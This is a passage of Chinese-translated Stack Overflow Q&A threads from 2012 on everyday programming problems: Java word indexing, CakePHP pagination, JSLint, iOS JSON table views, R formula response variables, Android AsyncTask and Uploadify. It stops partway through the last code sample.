2.  任何类型的 MySQL 结果集通常是或包含资源，对当前在 MySQL 服务器上打开的数据的引用。您不能序列化此类外部资源，因为它们现在才有效，但以后可能不会。

简而言之：您不能序列化 MySQL 结果集资源。

# java - HTML 单词索引器的实现

> ID：13217301
> 
> 赞同：0
> 
> 时间：2012-11-04T09:00:10.370
> 
> 标签：java, java.util.scanner

我正在为 HTML 文件编写单词索引器的实现。我遇到了构造函数的问题。

在构造函数中，我扫描 HTML 文件中的每个单词并将其添加到 TreeMap），其中链表是索引的集合，其中键（单词）出现在文件中。在测试期间，链表永远不会大于 1。我想知道是否有人可以查看我的代码并将我指向正确的方向，以了解事情变得混乱的地方。

```
while(scanner.hasNext()) {
            String temp = scanner.next().toLowerCase();

            if(this.wordMap.containsKey(temp)) {
                LinkedList<Integer> tempList = this.wordMap.get(temp);
                tempList.add(currentIndex);

                wordMap.put(temp, tempList);

                wordCount++;
                currentIndex++;
            }
            else {
                LinkedList<Integer> tempList = new LinkedList<Integer>();
                tempList.add(currentIndex);
                wordMap.put(temp, tempList);

                wordCount++;
                currentIndex++;
            }
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:39:59.953

这不是答案，不要在代码中重复自己（DRY）：

```
 while(scanner.hasNext()) {
        String temp = scanner.next().toLowerCase();

        LinkedList<Integer> tempList;
        if(this.wordMap.containsKey(temp)) {
            tempList = this.wordMap.get(temp);
        } else {
            tempList = new LinkedList<Integer>();
        }

        tempList.add(currentIndex);
        wordMap.put(temp, tempList);
        wordCount++;
        currentIndex++;
    } 
```

我在代码中找不到错误。我建议检查扫描仪中的分隔符。

# cakephp - 如何在 CakePHP 中对自定义数组进行分页

> ID：13217302
> 
> 赞同：4
> 
> 时间：2012-11-04T09:00:10.347
> 
> 标签：cakephp, cakephp-2.0

我想为自定义数组分页。我的控制器和视图代码如下。

控制器代码：

```
public function admin_detail(){
        $totalByDate = $this->Pbscodemetric->find('all',array('fields'=>array('created')));
        $createdDate = Set::extract('/Pbscodemetric/created', $totalByDate);
        $uniqueCreatedDate = array_unique($createdDate);
        $finalArray = array();
        foreach($uniqueCreatedDate as $created){
            $downloadsArr = $this->Pbscodemetric->find('all',array('fields'=>array('downloads_iphone','downloads_ipad','downloads_android'),'conditions'=>array('created'=>$created)));
            $download_iphone = array_sum(Set::extract('/Pbscodemetric/downloads_iphone',$downloadsArr));
            $download_ipad = array_sum(Set::extract('/Pbscodemetric/downloads_ipad',$downloadsArr));
            $downloads_android = array_sum(Set::extract('/Pbscodemetric/downloads_android',$downloadsArr));
            $finalArray[$created] = array(
                'downloads_iphone' => $download_iphone,
                'downloads_ipad' => $download_ipad,
                'downloads_android' => $downloads_android
            );
        }
        $this->set('finalArray',$finalArray);
    } 
```

查看代码：

```
<div class="pbscodemetrics index">
    <h2><?php echo __('Pbscodemetrics List Detail'); ?></h2>
    <table cellpadding="0" cellspacing="0">
        <tr>
            <th>Date</th>
            <th>iPhone</th>
            <th>iPad</th>
            <th>Android</th>    
        </tr>
        <?php 
        foreach($finalArray as $key => $final){?>
            <tr> 
                <td><?php echo $key;?></td>
                <td><?php echo $final['downloads_iphone'];?></td>
                <td><?php echo $final['downloads_ipad'];?></td>
                <td><?php echo $final['downloads_android'];?></td>
            </tr>
            <?php }?>
    </table>
</div>
<div class="actions">
    <?php echo $this->element('nav');?>
</div> 
```

现在我想设置分页。我知道 CakePHP 默认分页需要模型名称。但是我怎样才能为上面的代码做到这一点？

任何人都可以帮助我吗..

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-05T19:33:44.293

您可以实现自定义分页，请参阅Cookbook 中的[自定义查询分页](http://book.cakephp.org/2.0/en/core-libraries/components/pagination.html#custom-query-pagination)。但是，看起来您在那里所做的事情可以使用分组和 SQL`SUM`函数来完成，这样您就可以简单地使用内置的分页。例子：

```
$alias = $this->Pbscodemetric->alias;

$this->Pbscodemetric->virtualFields = array
(
    'downloads_iphone_sum' => sprintf('SUM(`%s.downloads_iphone`)', $alias),
    'downloads_ipad_sum' => sprintf('SUM(`%s.downloads_ipad`)', $alias),
    'downloads_android_sum' => sprintf('SUM(`%s.downloads_android`)', $alias)
);

$this->paginate = array
(
    'fields' => array
    (
        'downloads_iphone_sum',
        'downloads_ipad_sum',
        'downloads_android_sum',
        'created'
    ),
    'group' => 'created',
    'order' => array
    (
        'created' => 'desc'
    ),
    'limit' => 10
);

$data = $this->paginate($alias); 
```

这将为您提供[Paginator 助手](http://book.cakephp.org/2.0/en/core-libraries/helpers/paginator.html)兼容的结果，其中`downloads_iphone`summed`downloads_ipad`和`downloads_android`列按列分组`created`。它使用虚拟字段来检索默认 CakePHP 样式的结果，即它们可以像这样访问：

```
 <?php foreach($results as $result): ?>
        <tr> 
            <td><?php echo $result['Pbscodemetric']['created'];?></td>
            <td><?php echo $result['Pbscodemetric']['downloads_iphone_sum'];?></td>
            <td><?php echo $result['Pbscodemetric']['downloads_ipad_sum'];?></td>
            <td><?php echo $result['Pbscodemetric']['downloads_android_sum'];?></td>
        </tr>
    <?php endforeach; ?> 
```

# javascript - 在 JSLint 中，为什么这个块是空的？

> ID：13217309
> 
> 赞同：2
> 
> 时间：2012-11-04T09:02:00.240
> 
> 标签：javascript, jquery, jslint

我在 JSLint 上有点挣扎。我有以下代码：

```
// inside a for-loop
if ( aMatch.length > 0 ){
    temp =  wrap.find( aMatch );                                
    break;
} else if ( aMatch.length === 0 && o.siteMap[targetPath].length !== 0 ){
    temp = targetPath;
    break;
} 
```

JSLint 抱怨：

```
Empty block   "if ( aMatch.length > 0 ){" 
```

**问题：**
片段有什么问题。“块”对我来说不是空的......

感谢您的一些见解！

**编辑**：
这是问题中的全部功能（无评论）

```
loopHistory: function (scope, setPageContainer) {

    var self = this,
        o = self.options,
        wrap = $('div:jqmData(wrapper="true")').length > 1 ? $('div:jqmData(wrapper="true")').last() : $('div:jqmData(wrapper="true")'),
        $loopLength = $.mobile.urlHistory.stack.length-1, 
        temp, aMatch, parsedPath, dUrl, targetPath, i;

    if ( scope === "internal") {
        if ( $loopLength >= 2) {

            for ( i = $loopLength; i>1; i--) {
                parsedPath = $.mobile.path.parseUrl( $.mobile.urlHistory.stack[i-1].url );      
                targetPath = parsedPath.search.length !== "" ? ( parsedPath.pathname + parsedPath.search ) : parsedPath.pathname;

            if ( setPageContainer.jqmData('id') === $.mobile.urlHistory.stack[i-1].pageContainer.jqmData('id') && targetPath !== $.mobile.path.parseUrl( $.mobile.urlHistory.stack[$.mobile.urlHistory.activeIndex].pageUrl ).pathname ) {

                aMatch = $('div.ui-page').filter(function(){ return $(this).jqmData('url') === targetPath; });

                if ( aMatch.length === 0 && o.siteMap[targetPath].length !== 0 ){

                }

                ... ahh yes.... 
                if ( aMatch.length > 0 ){
                    temp =  wrap.find( aMatch );                                
                    break; 
```

好的。我懂了...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-04T09:24:13.830

好的。我的错。在 JSLint 提到的块之前有一个空的 if-else 块。

```
if ( aMatch.length === 0 && o.siteMap[targetPath].length !== 0 ){  }

if ( aMatch.length > 0 ){
   temp =  wrap.find( aMatch );                                
   break; 
```

从来没有注意到。

# c# - pop3 邮件客户端

> ID：13217314
> 
> 赞同：1
> 
> 时间：2012-11-04T09:02:29.333
> 
> 标签：c#, email, client, pop3

我正在尝试制作自己的流行邮件客户端，而不是使用网络上的库。所以我这样做了。

![代码部分 1](../Images/cb8f44793a9bedf1fed27ed7313591f3.png) ![代码部分 2](../Images/ff4d354179519cb6d076bb7bebc4c720.png)

如您所见，红色箭头在哪里，那是字符串的剩余部分，不知道如何摆脱它们。

在我为构建器附加的循环中，我不能放`for (int = 0; i <= charNumber; i++)`，因为我得到了索引错误。所以最后我必须`reader.ReadLine();`为“。”放两个一个。和一个这样我就可以摆脱那些残留物，这样我的应用程序就不会失败。

有什么想法吗？

# php - 如何将项目传输到服务器

> ID：13217317
> 
> 赞同：4
> 
> 时间：2012-11-04T09:03:53.917
> 
> 标签：php, mysql

我是编程领域的新手。我工作的公司给我分配了一个任务来开发一个包含会员登录和论坛的示例项目。我使用 mysql、php 和 apache 服务器开发了它。所以我的问题是“如何将它传输到 LMS 服务器上。我应该从服务器系统本身传输项目还是可以通过我的电脑通过互联网传输？” 我的问题可能看起来很简单，但我仍处于学习阶段。请帮我。谢谢..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T09:06:54.353

您需要 Internet 连接才能通过 FTP 连接目标服务器。
您还需要连接 MySQL 以将数据库转储推送到服务器。

[您可以在此处](https://stackoverflow.com/questions/425692/what-is-your-preferred-php-deployment-strategy)找到有关部署策略的更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T09:12:57.310

要传输所有文件，您需要一个 ftp 程序和 LMS 服务器上 ftp 服务器的登录信息。而对于 mysql 它取决于它，最简单的方法是如果你有一个 phpMyAdmin 界面，大多数时候你可以找到这个@ [http://thesite.com/phpMyAdmin](http://thesite.com/phpMyAdmin)或通过管理面板。然后复制（或导出）mysql 数据库并将其导入新服务器。你如何去做这件事在很大程度上取决于平台。

希望这可以帮助。

要在没有 phpMyAdmin 的情况下导出 mysql：[http ://www.mydigitallife.info/how-to-backup-and-restore-export-and-import-mysql-databases-tutorial/](http://www.mydigitallife.info/how-to-backup-and-restore-export-and-import-mysql-databases-tutorial/)

# ios - 表视图 iOS 中的 JSON 数据已加载

> ID：13217318
> 
> 赞同：1
> 
> 时间：2012-11-04T09:03:54.980
> 
> 标签：ios, json

我可以解析数据并查看输出，但是当我调用包含 JSON 的视图时，我无法在表视图中显示它们，应用程序崩溃了

这是我的代码：

在第一行代码中，我们定义了一个宏，它为我们提供了一个后台队列——我喜欢为此设置一个 kBgQueue 快捷方式，这样我可以让我的代码更紧凑。在第二行代码中，我们创建了一个名为 kLatestKivaLoansURL 的宏，它返回一个指向该 URL [http://api.kivaws.org/v1/loans/search.json?status=fundraising](http://api.kivaws.org/v1/loans/search.json?status=fundraising)的 NSURL 。

```
#define kBgQueue dispatch_get_global_queue(
 DISPATCH_QUEUE_PRIORITY_DEFAULT, 0) //1
#define kLatestKivaLoansURL [NSURL URLWithString: 
 @"http://api.kivaws.org/v1/loans/search.json?status=fundraising"] //2
 @interface TeacherViewController ()
   @end
@implementation TeacherViewController

- (id)initWithStyle:(UITableViewStyle)style
{
    self = [super initWithStyle:style];
    if (self) {
        // Custom initialization
    }
    return self;
} 
```

将 kBGQueue 定义为为我们提供后台队列的宏？

```
- (void)viewDidLoad

{
    [super viewDidLoad];

    dispatch_async(kBgQueue, ^{
        NSData* data = [NSData dataWithContentsOfURL:kLatestKivaLoansURL];
        [self performSelectorOnMainThread:@selector(fetchedData:)
                               withObject:data waitUntilDone:YES];
    });

}
@synthesize latestLoans;
@synthesize arrayOfFighterName; 
```

将被调用并将 NSData 实例传递给它。在我们的例子中，JSON 文件相对较小，所以我们将在主线程中的 fetchedData: 中进行解析。如果您正在解析大型 JSON 提要（通常是这种情况），请务必在后台执行此操作。

```
- (void)fetchedData:(NSData *)responseData {
    //parse out the json data
    NSError* error;
    NSDictionary* json = [NSJSONSerialization
                          JSONObjectWithData:responseData //1
                          options:kNilOptions
                          error:&error];

     latestLoans = [json objectForKey:@"loans"]; //2
    arrayOfFighterName=[[NSMutableArray alloc] init];
//NSLog(@"loans: %@", latestLoans); //3
    for( int i = 0; i<[latestLoans count]; i++){

        // NSLog(@"%@", [matchListArray objectAtIndex:i]);
        arrayOfFighterName[i]=[[latestLoans objectAtIndex:i] objectForKey:@"name"];
       // NSLog(@"%@", [arrayOfFighterName objectAtIndex:i]);
    }

}
- (void)viewDidUnload
{

    [super viewDidUnload];
    latestLoans = nil;
}

- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    return (interfaceOrientation == UIInterfaceOrientationPortrait);
}

#pragma mark - Table view data source

- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
#warning Potentially incomplete method implementation.
    // Return the number of sections.
    return 1;

} 
```

在表格视图中显示结果但不幸的是结果不显示并且应用程序崩溃了

```
- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
{
#warning Incomplete method implementation.
    // Return the number of rows in the section.
   return [arrayOfFighterName count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    UITableViewCell *cell = [tableView
                           dequeueReusableCellWithIdentifier:@"TeacherCell"];
            cell.textLabel.text = [arrayOfFighterName objectAtIndex:indexPath.row];
       return cell;

   //  NSLog(@"viewDidLoad is called");
}

/*
// Override to support conditional editing of the table view.
- (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath
{
    // Return NO if you do not want the specified item to be editable.
    return YES;
}
*/

/*
// Override to support editing the table view.
- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (editingStyle == UITableViewCellEditingStyleDelete) {
        // Delete the row from the data source
        [tableView deleteRowsAtIndexPaths:[NSArray arrayWithObject:indexPath] withRowAnimation:UITableViewRowAnimationFade];
    }   
    else if (editingStyle == UITableViewCellEditingStyleInsert) {
        // Create a new instance of the appropriate class, insert it into the array, and add a new row to the table view
    }   
}
*/

/*
// Override to support rearranging the table view.
- (void)tableView:(UITableView *)tableView moveRowAtIndexPath:(NSIndexPath *)fromIndexPath toIndexPath:(NSIndexPath *)toIndexPath
{
}
*/

/*
// Override to support conditional rearranging of the table view.
- (BOOL)tableView:(UITableView *)tableView canMoveRowAtIndexPath:(NSIndexPath *)indexPath
{
    // Return NO if you do not want the item to be re-orderable.
    return YES;
}
*/

#pragma mark - Table view delegate

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    // Navigation logic may go here. Create and push another view controller.
    /*
     <#DetailViewController#> *detailViewController = [[<#DetailViewController#> alloc] initWithNibName:@"<#Nib name#>" bundle:nil];
     // ...
     // Pass the selected object to the new view controller.
     [self.navigationController pushViewController:detailViewController animated:YES];
     */
}

@end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:11:53.120

更改获取的数据方法，如：

```
- (void)fetchedData:(NSData *)responseData {
    //parse out the json data
    NSError* error;
    NSDictionary* json = [NSJSONSerialization
                          JSONObjectWithData:responseData //1
                          options:kNilOptions
                          error:&error];

     latestLoans = [json objectForKey:@"loans"]; //2
    arrayOfFighterName=[[NSMutableArray alloc] init];
//NSLog(@"loans: %@", latestLoans); //3
    for( int i = 0; i<[latestLoans count]; i++){

        // NSLog(@"%@", [matchListArray objectAtIndex:i]);
        arrayOfFighterName[i]=[[latestLoans objectAtIndex:i] objectForKey:@"name"];
       // NSLog(@"%@", [arrayOfFighterName objectAtIndex:i]);
    }

[tableView reloadData];
} 
```

因为在第一次，tableView 是在数据添加到数组之前加载的。由于异步调用。当从服务器检索数据时，数据被解析并添加到数组中。所以你需要重新加载你的 tableView 来显示数据。

请参考本[教程](http://www.raywenderlich.com/5492/working-with-json-in-ios-5)中的异步调用。

# ios - 我如何知道用户已在 iOS 上登录 Facebook？

> ID：13217320
> 
> 赞同：0
> 
> 时间：2012-11-04T09:04:11.033
> 
> 标签：ios, facebook, twitter, login, ios6

我正在使用 iOS 6 上的[Accounts Framework](http://developer.apple.com/library/ios/#documentation/Accounts/Reference/AccountsFrameworkRef/_index.html#//apple_ref/doc/uid/TP40011024)来访问 Facebook。只要用户在“设置”中登录 Facebook，它就可以很好地工作。但是，当他们*没有*登录 Facebook 时，我的调用会`-requestAccessToAccountsWithType:options:completion:`向完成块发送一个通用系统错误：

```
Error Domain=com.apple.accounts Code=6 "The operation couldn’t be completed. (com.apple.accounts error 6.)" 
```

似乎很没用。还有其他方法我应该知道用户没有登录吗？

（顺便说一句，当用户登录 Facebook 但在“设置”中禁用了对我的应用程序的访问时，这不是问题：这会返回一个明确的错误代码。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-08T07:22:13.050

我认为[`+isAvailableForServiceType:`SLComposeViewController](http://developer.apple.com/library/ios/#documentation/NetworkingInternet/Reference/SLComposeViewController_Class/Reference/Reference.html)是我所需要的。我没想到那里看，因为我没有使用 SLComposeViewController。但是我不明白为什么我不能调用这个类方法并且如果它返回 false 也不会尝试请求访问。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-05T17:23:00.547

我正在尝试解决同样的问题。我刚刚注意到，当用户没有将手机与facebook连接时，错误代码是6。当用户连接并按下“不允许”按钮时为 7。该文档位于 ACError.h 文件中。

# r - 如何可靠地从公式对象中获取因变量名称？

> ID：13217322
> 
> 赞同：38
> 
> 时间：2012-11-04T09:04:58.387
> 
> 标签：r

假设我有以下公式：

```
myformula<-formula("depVar ~ Var1 + Var2") 
```

如何可靠地从公式对象中获取因变量名称？

我没有找到任何用于此目的的内置函数。我知道这`as.character(myformula)[[2]]`很有效

```
sub("^(\\w*)\\s~\\s.*$","\\1",deparse(myform)) 
```

在我看来，这些方法更像是一种骇客，而不是一种可靠和标准的方法。

* * *

有谁知道例如`lm`使用什么方法？我看过它的代码，但对我来说有点神秘......为了您的方便，这里引用一个：

```
 > lm
function (formula, data, subset, weights, na.action, method = "qr", 
    model = TRUE, x = FALSE, y = FALSE, qr = TRUE, singular.ok = TRUE, 
    contrasts = NULL, offset, ...) 
{
    ret.x <- x
    ret.y <- y
    cl <- match.call()
    mf <- match.call(expand.dots = FALSE)
    m <- match(c("formula", "data", "subset", "weights", "na.action", 
        "offset"), names(mf), 0L)
    mf <- mf[c(1L, m)]
    mf$drop.unused.levels <- TRUE
    mf[[1L]] <- as.name("model.frame")
    mf <- eval(mf, parent.frame())
    if (method == "model.frame") 
        return(mf)
    else if (method != "qr") 
        warning(gettextf("method = '%s' is not supported. Using 'qr'", 
            method), domain = NA)
    mt <- attr(mf, "terms")
    y <- model.response(mf, "numeric")
    w <- as.vector(model.weights(mf))
    if (!is.null(w) && !is.numeric(w)) 
        stop("'weights' must be a numeric vector")
    offset <- as.vector(model.offset(mf))
    if (!is.null(offset)) {
        if (length(offset) != NROW(y)) 
            stop(gettextf("number of offsets is %d, should equal %d (number of observations)", 
                length(offset), NROW(y)), domain = NA)
    }
    if (is.empty.model(mt)) {
        x <- NULL
        z <- list(coefficients = if (is.matrix(y)) matrix(, 0, 
            3) else numeric(), residuals = y, fitted.values = 0 * 
            y, weights = w, rank = 0L, df.residual = if (!is.null(w)) sum(w != 
            0) else if (is.matrix(y)) nrow(y) else length(y))
        if (!is.null(offset)) {
            z$fitted.values <- offset
            z$residuals <- y - offset
        }
    }
    else {
        x <- model.matrix(mt, mf, contrasts)
        z <- if (is.null(w)) 
            lm.fit(x, y, offset = offset, singular.ok = singular.ok, 
                ...)
        else lm.wfit(x, y, w, offset = offset, singular.ok = singular.ok, 
            ...)
    }
    class(z) <- c(if (is.matrix(y)) "mlm", "lm")
    z$na.action <- attr(mf, "na.action")
    z$offset <- offset
    z$contrasts <- attr(x, "contrasts")
    z$xlevels <- .getXlevels(mt, mf)
    z$call <- cl
    z$terms <- mt
    if (model) 
        z$model <- mf
    if (ret.x) 
        z$x <- x
    if (ret.y) 
        z$y <- y
    if (!qr) 
        z$qr <- NULL
    z
} 
```

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-11-04T09:38:18.657

尝试使用`all.vars`：

```
all.vars(myformula)[1] 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-11-04T10:03:00.540

我想您也可以编写自己的函数来使用`terms()`：

```
getResponse <- function(formula) {
    tt <- terms(formula)
    vars <- as.character(attr(tt, "variables"))[-1] ## [1] is the list call
    response <- attr(tt, "response") # index of response var
    vars[response] 
}

R> myformula <- formula("depVar ~ Var1 + Var2")
R> getResponse(myformula)
[1] "depVar" 
```

它就像 hacky 一样，`as.character(myformyula)[[2]]`但是您可以确保获得正确的变量，因为调用解析树的顺序不会很快改变。

对于多个因变量，这不是很好：

```
R> myformula <- formula("depVar1 + depVar2 ~ Var1 + Var2")
R> getResponse(myformula)
[1] "depVar1 + depVar2" 
```

因为他们需要进一步处理。

* * *

## 回答 #3

> 赞同：13
> 
> 时间：2013-07-24T08:06:24.020

我找到了一个有用的包“formula.tools”，它适合您的任务。

代码示例：

> f <- as.formula(a1 + a2~a3 + a4)
> 
> lhs.vars(f) #获取因变量

[1] “a1” “a2”

> rhs.vars(f) #获取自变量

[1] “a3” “a4”

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-11-04T11:16:25.297

根据您的编辑以获得实际响应，而不仅仅是它的名称，我们可以使用非标准评估惯用语`lm()`和大多数其他建模函数使用的基本 R 中的公式接口

```
form <- formula("depVar ~ Var1 + Var2")
dat <- data.frame(depVar = rnorm(10), Var1 = rnorm(10), Var2 = rnorm(10))

getResponse <- function(form, data) {
    mf <- match.call(expand.dots = FALSE)
    m <- match(c("formula", "data"), names(mf), 0L)
    mf <- mf[c(1L, m)]
    mf$drop.unused.levels <- TRUE
    mf[[1L]] <- as.name("model.frame")
    mf <- eval(mf, parent.frame())
    y <- model.response(mf, "numeric")
    y
} 

> getResponse(form, dat)
          1           2           3           4           5 
-0.02828573 -0.41157817  2.45489291  1.39035938 -0.31267835 
          6           7           8           9          10 
-0.39945771 -0.09141438  0.81826105  0.37448482 -0.55732976 
```

如您所见，这会从提供的数据框中获取实际的响应变量数据。

其工作原理是该函数首先捕获函数调用而不扩展`...`参数，因为其中包含评估公式数据所需的内容。

接下来，`"formula"`and`"data"`参数与调用匹配。该行`mf[c(1L, m)]`从调用 ( `1L`) 中选择函数名称以及两个匹配参数的位置。的`drop.unused.levels`参数在下一行`model.frame()`中设置为`TRUE`，然后更新调用以将调用中的函数名从 切换`lm`为`model.frame`。上面的代码所做的就是将调用`lm()`和处理调用到`model.frame()`函数的调用中。

然后在函数的父环境中评估这个修改后的调用 - 在这种情况下是全局环境。

最后一行使用`model.response()`提取器函数从模型框架中获取响应变量。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-04T09:54:13.583

这应该始终为您提供所有依赖变量：

```
myformula<-formula("depVar1 + depVar2 ~ Var1 + Var2")
as.character(myformula[[2]])[-1]
#[1] "depVar1" "depVar2" 
```

而且我不会认为这特别“hacky”。

**编辑：**

3 个家属发生了一些奇怪的事情：

```
myformula<-formula("depVar1 + depVar2 + depVar3 ~ Var1 + Var2")
as.character(myformula[[2]])
#[1] "+"                 "depVar1 + depVar2" "depVar3" 
```

所以这可能不像我想象的那么可靠。

**编辑2：**

好的，`myformula[[2]]`是一个语言对象，`as.character`似乎做一些类似于`languageEl`.

```
length(myformula[[2]])
#[1] 3
languageEl(myformula[[2]],which=1)
#`+`
languageEl(myformula[[2]],which=2)
#depVar1 + depVar2
languageEl(myformula[[2]],which=3)
#depVar3
languageEl(languageEl(myformula[[2]],which=2),which=2)
#depVar1 
```

如果您检查每个元素的长度，您可以创建自己的提取函数。但这可能太过分了。

**Edit3：** 根据@seancarmody 的回答是要走`all.vars(myformula[[2]])`的路。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-09-07T00:45:03.727

我知道这个问题很老了，但我想我会添加一个不需要索引的基本 R 答案，不依赖于调用中列出的变量的顺序`all.vars`，并且将响应变量作为单独的有多个时的元素：

```
myformula <- formula("depVar1 + depVar2 ~ Var1 + Var2")
all_vars <- all.vars(myformula)
response <- all_vars[!(all_vars %in% labels(terms(myformula)))]

> response
[1] "depVar1" "depVar2" 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2019-03-24T10:58:58.973

使用`all.vars`非常棘手，因为它不会检测到单边公式的响应。例如

```
all.vars(~x+1)
[1] "x" 
```

那是错的。

这是获得响应的最可靠方法：

```
 getResponseFromFormula = function(formula) {
        if (attr(terms(as.formula(formula))    , which = 'response'))
            all.vars(formula)[1]
        else
            NULL
    }

getResponseFromFormula(~x+1)
NULL

 getResponseFromFormula(y~x+1)
[1] "y" 
```

请注意，如果公式包含多个响应变量，您可以`all.vars(formula)[1]`在函数中替换为。`formula[2]`

# android - 我们可以在 AsyncTask 中多次运行 HttpClient 吗？

> ID：13217323
> 
> 赞同：0
> 
> 时间：2012-11-04T09:05:08.423
> 
> 标签：android, android-asynctask, httpclient

由于 android [doc](http://developer.android.com/reference/android/os/AsyncTask.html)，该任务只能执行一次。

我正在尝试在 UI-Thread 中运行 HttpClient。但它只允许一次。如果我想从第一次启动时尚未运行的另一个链接获取另一个数据，我该怎么做？直到我在应用程序第一次启动时获得所有数据，这需要很长时间。有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T09:09:07.687

您可以在 AsyncTask 中执行多项操作

```
protected Void doInBackground(Void param...){
    downloadURL(myFirstUrl);
    downloadURL(mySecondUrl);
} 
```

AsyncTask 只能执行一次。这意味着，如果您创建 AsyncTask 的实例，则只能调用`execute()`一次。如果要再次执行 AsyncTask，请创建一个新的 AsyncTask：

```
MyAsyncTask myAsyncTask = new MyAsyncTask();
myAsyncTask.execute(); //Will work
myAsyncTask.execute(); //Will not work, this is the second time
myAsyncTask = new MyAsyncTask();
myAsyncTask.execute(); //Will work, this is the first execution of a new AsyncTask. 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T09:13:54.737

您正在主线程上运行网络操作。使用异步任务在后台线程中运行网络操作（在后台线程中执行您的 http 请求）。

在这样的异步任务中建立网络：

```
class WebRequestTask extends AsyncTask{

    protected void onPreExecute() {
    //show a progress dialog to the user or something
    }

    protected void doInBackground() {
        //Do your networking here
    }

    protected void onPostExecute() {
        //do something with your 
       // response and dismiss the progress dialog
    }
  }

  new WebRequestTask().execute(); 
```

如果您不知道如何使用异步任务，这里有一些教程供您参考：

[http://mobileorchard.com/android-app-developmentthreading-part-2-async-tasks/](http://mobileorchard.com/android-app-developmentthreading-part-2-async-tasks/)

[http://www.vogella.com/articles/AndroidPerformance/article.html](http://www.vogella.com/articles/AndroidPerformance/article.html)

以下是来自 Google 的官方文档：

[https://developer.android.com/reference/android/os/AsyncTask.html](https://developer.android.com/reference/android/os/AsyncTask.html)

You can call the async task multiple times whenever needed to perform the download tasks. You can pass parameters to the async task so that you can specify what data it should download (for example by passing a different url each time as a parameter to the async task). In this way, using a modular approach, you can call the same aync task multiple times with different parameters to download the data. The UI thread wont be blocked so the user experience will not be hindered and your code will be thread safe too.

# jquery - 如何禁用uploadify上传按钮

> ID：13217325
> 
> 赞同：1
> 
> 时间：2012-11-04T09:05:59.903
> 
> 标签：jquery, asp.net, uploadify

我正在尝试设计一个我正在使用**Uploadify**的多文件上传器。我将有 5 个上传按钮。我想要的是启用第一个，而在页面加载时禁用其他 4 个。在第一个按钮中成功上传文件后，应启用第二个按钮，依此类推。

我试过搜索，但有一些帖子建议隐藏上传者（高度 = 0）。

我在准备好的功能中尝试过这样的事情

```
 $('#FileUpload2').fileUpload('enabled', false);
  $('#FileUpload3').fileUpload('enabled', false);
  $('#FileUpload4').fileUpload('enabled', false);
  $('#FileUpload5').fileUpload('enabled', false); 
```

我不确定这是否正确。我试图尽可能清楚地说明这一点。如果可能，请为我提供替代解决方案。

**更新**

这是完整的代码

```
<head runat="server">
    <title></title>
     <link rel="Stylesheet" type="text/css" href="CSS/uploadify.css" />
     <script type="text/javascript" src="scripts/jquery-1.3.2.min.js"></script>
    <script type="text/javascript" src="scripts/jquery.uploadify.js"></script>
</head>
<body>
<form id="form1" runat="server">
    <div style = "padding:40px">
        <asp:FileUpload ID="FileUpload1" runat="server" />
    </div>
    <div id="fu2" style = "padding:40px;">
        <asp:FileUpload ID="FileUpload2" runat="server" />
    </div>
    <ul id="appendImg">

    </ul>
</form>
</body>
</html>
<script type = "text/javascript">
    $(document).ready(function () {
        // put all your jQuery goodness in here.

        $("#<%=FileUpload2.ClientID%>").uploadify('disable', true);

    });
    $(window).load(
    function () {
        $("#<%=FileUpload1.ClientID%>").fileUpload({
            'uploader': 'scripts/uploader.swf',
            'uploadLimit': 3,
            'cancelImg': 'images/cancel.png',
            'buttonText': 'Browse Files',
            'script': 'Upload.ashx',
            'folder': 'uploads',
            'fileDesc': 'Image Files',
            'fileExt': '*.jpg;*.jpeg;*.gif;*.png',
            'multi': false,
            'auto': true,
            'onComplete': function (event, queueID, fileObj, response, data) {
                //alert(fileObj.filePath);
               // $('#kk').attr('src', "" + fileObj.filePath + "");
                var html = '';
                html += '<li><img src="' + fileObj.filePath + '" alt="" style="width:100px;height:100px;" /></li>';
                $('#appendImg').append(html);
                //$('#fu2').attr('style', 'padding:40px;display:block;');
            },
            'onAllComplete': function (event, queueID, fileObj, response, data) {

            },
            'onUploadSuccess': function (file, data, response) {
                $('#FileUpload1').uploadify('settings', 'height', 0);
                $('#FileUpload1').uploadify('settings', 'width', 0);
                $('#FileUpload2').uploadify('settings', 'height', 400);
                $('#FileUpload2').uploadify('settings', 'width', 400);
            }
        });

        $("#<%=FileUpload2.ClientID%>").fileUpload({
            'uploader': 'scripts/uploader.swf',
            'uploadLimit': 3,
            'cancelImg': 'images/cancel.png',
            'buttonText': 'Browse Files',
            'script': 'Upload.ashx',
            'folder': 'uploads',
            'fileDesc': 'Image Files',
            'fileExt': '*.jpg;*.jpeg;*.gif;*.png',
            'multi': false,
            'auto': true,
            'setDisabled':true,
            'onComplete': function (event, queueID, fileObj, response, data) {
                //alert(fileObj.filePath);
                // $('#kk').attr('src', "" + fileObj.filePath + "");
                var html = '';
                html += '<li><img src="' + fileObj.filePath + '" alt="" style="width:100px;height:100px;" /></li>';
                $('#appendImg').append(html);
            },
            'onAllComplete': function (event, queueID, fileObj, response, data) {

            }
        });
